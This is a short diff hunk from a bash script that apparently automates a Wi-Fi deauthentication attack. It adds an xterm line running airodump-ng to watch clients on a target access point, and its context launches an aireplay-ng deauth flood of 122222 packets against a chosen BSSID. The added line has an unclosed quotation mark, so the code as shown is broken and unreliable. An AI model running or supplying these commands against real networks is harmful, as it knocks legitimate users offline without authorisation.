@@ -760,6 +760,7 @@ n_secondes=5
 sleep 5
 kill $!
 clear
+xterm -title CLIENTS -e "airodump-ng --bssid $bssidda -c $chanelda $interfaceda &
 echo -e  '\e[1;32m '
 echo attack started ... 
 xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda $interfaceda
